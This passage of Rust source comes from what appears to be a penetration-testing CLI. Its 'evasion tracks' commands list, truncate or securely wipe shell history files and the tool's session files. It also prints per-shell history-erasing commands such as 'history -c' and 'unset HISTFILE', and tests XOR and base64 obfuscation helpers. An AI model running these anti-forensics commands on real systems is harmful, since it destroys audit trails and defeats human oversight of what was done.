            colored(&files.other.len().to_string(), YELLOW)
        );
        for f in &files.other {
            let size = std::fs::metadata(f).map(|m| m.len()).unwrap_or(0);
            println!("        {} ({} bytes)", f.display(), size);
        }
    }

    println!();
    Output::info("Summary:");
    println!("    Total history files:  {}", stats.history_files);
    println!("    Total history bytes:  {} bytes", stats.history_bytes);
    println!("    Session files (.rb):  {}", stats.session_files);

    println!();
    Output::info("To clear:");
    println!("    rb evasion tracks clear           # Quick clear");
    println!("    rb evasion tracks clear --secure  # Secure wipe");

    Ok(())
}

fn execute_tracks_clear(ctx: &CliContext) -> Result<(), String> {
    let secure = ctx.flags.contains_key("secure");
    let shell_filter = ctx.flags.get("shell");

    Output::header("Track Clearer");
    println!();

    Output::warning("This will PERMANENTLY clear shell history files!");
    Output::warning("For authorized penetration testing only.");
    println!();

    let mode = if secure {
        "Secure wipe (overwrite + truncate)"
    } else {
        "Quick clear (truncate only)"
    };
    Output::item("Mode", mode);

    if let Some(shell) = shell_filter {
        Output::item("Shell filter", shell);
    }

    println!();
    Output::spinner_start("Clearing history");

    let results = if let Some(shell) = shell_filter {
        tracks::clear_shell_history(shell, secure)
    } else {
        tracks::clear_all_history(secure)
    };

    Output::spinner_done();
    println!();

    let mut success_count = 0;
    let mut failed_count = 0;
    let mut total_bytes = 0u64;

    for result in &results {
        if result.success {
            success_count += 1;
            total_bytes += result.bytes_cleared;
            println!(
                "    {} {} ({} bytes)",
                colored("[CLEARED]", GREEN),
                result.file.display(),
                result.bytes_cleared
            );
        } else {
            failed_count += 1;
            let err = result.error.as_deref().unwrap_or("unknown");
            println!(
                "    {} {} ({})",
                colored("[FAILED]", RED),
                result.file.display(),
                err
            );
        }
    }

    println!();
    Output::info("Summary:");
    println!("    Files cleared:  {}", success_count);
    println!("    Bytes cleared:  {}", total_bytes);
    if failed_count > 0 {
        println!("    Failed:         {}", failed_count);
    }

    println!();
    let shell = tracks::detect_shell();
    Output::info(&format!("To clear current session ({}):", shell));
    println!("    {}", tracks::get_clear_session_command(&shell));

    Ok(())
}

fn execute_tracks_sessions() -> Result<(), String> {
    Output::header("Session File Cleaner");
    println!();

    Output::warning("This will clear redblue session files!");
    println!();

    Output::spinner_start("Clearing session files");

    let results = tracks::clear_redblue_sessions();

    Output::spinner_done();
    println!();

    if results.is_empty() {
        Output::info("No session files found");
        return Ok(());
    }

    let mut success_count = 0;
    let mut total_bytes = 0u64;

    for result in &results {
        if result.success {
            success_count += 1;
            total_bytes += result.bytes_cleared;
            println!(
                "    {} {} ({} bytes)",
                colored("[CLEARED]", GREEN),
                result.file.display(),
                result.bytes_cleared
            );
        } else {
            let err = result.error.as_deref().unwrap_or("unknown");
            println!(
                "    {} {} ({})",
                colored("[FAILED]", RED),
                result.file.display(),
                err
            );
        }
    }

    println!();
    Output::success(&format!(
        "Cleared {} session files ({} bytes)",
        success_count, total_bytes
    ));

    Ok(())
}

fn execute_tracks_command(ctx: &CliContext) -> Result<(), String> {
    let shell = ctx
        .flags
        .get("shell")
        .map(|s| s.to_string())
        .unwrap_or_else(tracks::detect_shell);

    Output::header("Session Clear Command");
    println!();

    Output::item("Detected shell", &tracks::detect_shell());
    Output::item("Target shell", &shell);
    println!();

    Output::info("Run this command to clear current session history:");
    println!();
    println!(
        "    {}",
        colored(&tracks::get_clear_session_command(&shell), GREEN)
    );
    println!();

    Output::info("All shells:");
    println!("    bash:  history -c && history -w");
    println!("    zsh:   fc -p && history -p");
    println!("    fish:  history clear");
    println!("    sh:    unset HISTFILE");

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_xor_roundtrip() {
        let original = "test string";
        let key = 0x42;
        let obfuscated = obfuscate::xor_obfuscate(original, key);
        let recovered = obfuscate::xor_deobfuscate(&obfuscated, key);
        assert_eq!(original, recovered);
    }

    #[test]
    fn test_base64_roundtrip() {
        let original = b"test data";
        let encoded = obfuscate::base64_encode(original);
        let decoded = obfuscate::base64_decode(&encoded).unwrap();
        assert_eq!(original.to_vec(), decoded);
    }
}
